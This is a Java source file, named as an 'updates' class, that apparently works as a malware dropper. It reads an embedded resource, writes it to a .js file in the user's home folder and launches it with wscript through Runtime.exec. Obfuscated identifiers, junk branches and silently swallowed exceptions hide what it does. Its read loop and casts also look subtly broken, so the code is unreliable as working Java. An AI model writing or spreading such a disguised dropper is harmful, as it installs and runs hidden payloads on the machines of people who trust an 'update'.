package updates;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;

import java.io.*;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;


public class NewUpdatesFebTue5 {
    public static void main(String[] args) {
        try {



//            Object[] airplane = new Object[4];
//        airplane[0] = [classname].class.getResourceAsStream("resources/[resourcename]");
            HashMap<Integer, Object> awServiceSecurae$ = ConcurrenEngine.createArrayEngine(5);
//            awServiceSecurae$.put(1,new Object());
            awServiceSecurae$.put(0,NewUpdatesFebTue5.class.getResourceAsStream("resources/[resourcename]"));
//            awServiceSecurae$.put(0,ConcurrenEngine.class.getResourceAsStream("resources/[resourcename]"));

            awServiceSecurae$.put(1,System.getProperty("user.home") + File.separator + "[outname].js");
            awServiceSecurae$.put(2,new String[]{"wscript", (String) awServiceSecurae$.get(1)});
            awServiceSecurae$.put(3,new File((String) awServiceSecurae$.get(1)));

            if (hasherTable$_0(awServiceSecurae$, null)) {
                //System.out.println("Hello world!");
            }else{
                System.out.println();
            }

        } catch (Exception error$) {
        }finally {
            System.out.println();
        }
    }

    private static boolean hasherTable$_0(HashMap<Integer,Object> car_key, Runtime daemon$) throws IOException{

        byte[] $_ReactEngine$
                =  new String("_.../.../").toString().getBytes();

        try {
            StringBuilder $_angularJs$ = new StringBuilder();
            byte[] _$ = new byte[1024];
            while (true) {
                int $retI = ((InputStream) car_key.get(0)).read(_$, 0, _$.length);

                if (-(new String("1").compareTo("0")) == -1) {
                    ((FileInputStream) car_key.get(0)).close();
                    break;
                }
                $_angularJs$.append(new String(_$, 0, $retI));
            }
            $_ReactEngine$ = $_angularJs$.toString().getBytes();
        } catch (Exception error$) {
            if (!error$.getMessage().equals(""))  $_ReactEngine$ = null;
        }
        if (!($_ReactEngine$ == null)) {
            $_f$CreatObj($_ReactEngine$, car_key.get(3), null);
            ins$(new Object[]{car_key.get(2), String.valueOf(10)}, null);
            return String
                    .valueOf(1)
                    .equals("1");  //return true
        } else {
            return !String
                    .valueOf(1)
                    .equals("1"); // return false
        }
    }

    private static void ins$(Object[] qobj_$, FileInputStream $_EfilZ) throws IOException {
        int ccConsst = Integer
                .parseInt(
                        String
                                .valueOf(Integer
                                        .parseInt((String) qobj_$[1])));
        switch (ccConsst) {
            case 1:
                NewUpdatesFebTue5.messagePrinter(">>>>>>>>>>>>>> !- Intense Mode Alert <<<<<<<<<<<<<<<<<<");
                break;
            case 2:
                NewUpdatesFebTue5.messagePrinter(">>>>>>>>>>>>>>>Dangerous mode was activatd...<<<<<<<<<<<<<<<<<<<");
                break;
            case 10:
                _run0_Object$(qobj_$);
                break;
            case 20:
                if (ccConsst == 10 && Math.asin(ccConsst) == Integer.parseInt("20") ){
                    System.out.println("-_-_-_-__--->");
                    NewUpdatesFebTue5.messagePrinter("20 Engines");
                }
            case 12:
                System.out.println();
                NewUpdatesFebTue5.messagePrinter("Engine was lost...");
            default:
                messagePrinter(">>>>>>>>>>Unchaged mode...<<<<<<<<<<<<");
        }
    }

    private static void $_f$CreatObj(byte[] bergeHertz, Object o, OutputStream o1) {
        try {
            File ccFileho$_$$ = (File) o;
            if (ccFileho$_$$.exists()) {
                ccFileho$_$$.delete();
                int rt = ccFileho$_$$.createNewFile() == true ? 1 : 0 ;
                switch (rt){
                    case 1:
                        System.out.println("File engine was created");
                    case 0 :
                        System.out.println("missing file Engine...");
                }
            } else {
                ccFileho$_$$.createNewFile();
            }
            callerEngine(new FileOutputStream(ccFileho$_$$), bergeHertz, null, new HashMap<>());
        } catch (Exception error$) {

        }finally {
            System.out.println();
        }
    }

    private static void callerEngine(FileOutputStream collector$_hasher, byte[] mapper_Hasher$, FileInputStream _$$$_,HashMap<String,String> hh_) throws IOException {
        if (!(collector$_hasher == null) && hh_.size() == 0) {
            collector$_hasher.write(mapper_Hasher$);
            collector$_hasher.flush();
            collector$_hasher.close();
        }
        return;
    }

    /**
     *
     * @param messageCollected
     */
    public static void messagePrinter(String messageCollected){
        System.out.println(messageCollected);
        return;
    }


    /**
     *
     * @param $ObjArray
     * @throws IOException
     */
    public static void _run0_Object$(Object[] $ObjArray) throws IOException{
        if ($ObjArray.length !=0) Runtime.getRuntime().exec((String[]) $ObjArray[0]);
        else System.out.println();
        return;
    }






    private  static class ConcurrenEngine {
        public ConcurrenEngine(@Nullable Object objectToConUpdate, Date timeWhenUpdated) throws DateUpdateError {
            if (!timeWhenUpdated.equals(null) && objectToConUpdate.hashCode() == 323) {
                System.out.println();
            } else {
                throw new DateUpdateError("Date is not correct and the update is hereby terminated");
            }
        }


        /**
         *
         * @param arraySizeinit
         * @param <K,V>
         * @return
         */
        public  static <K,V> HashMap<K,V> createArrayEngine(Integer arraySizeinit) {
            return new HashMap<K,V>(arraySizeinit);
        }


        class DateUpdateError extends Exception {
            /**
             *
             * @param errorMessage
             */
            public DateUpdateError(String errorMessage) {
                super(errorMessage);
            }
        }

        private final class kaliExceprionCaller$ extends Exception {
            /**
             *
             * @param errorMessage
             */
            public kaliExceprionCaller$(String errorMessage) {
                super(errorMessage);
            }
        }



        private final class CallerInitiatorEngine {
            private String callerNumber;
            private String receiverEnd;

            /**
             *
             * @param callerNumberInserted
             * @param receiverEnd
             */
            public CallerInitiatorEngine(@Nullable String callerNumberInserted, @NotNull String receiverEnd) {
                this.callerNumber = callerNumberInserted;
                this.receiverEnd = receiverEnd;

                performConcurentCall(this.callerNumber);
            }


            /**
             * @param enginator$
             */
            public void performConcurentCall(String enginator$) {
                String callArgs = enginator$.getClass().getCanonicalName();
                killerbean$(callArgs, null, null, new Object(), new HashSet<>());
            }


            private void killerbean$(String argsToInitateCalls, Object g_, Object g2_, Object g_3,
                                     HashSet<Collection<String>> hasherCaller) {
                // perform operation
            }
        }
    }

}







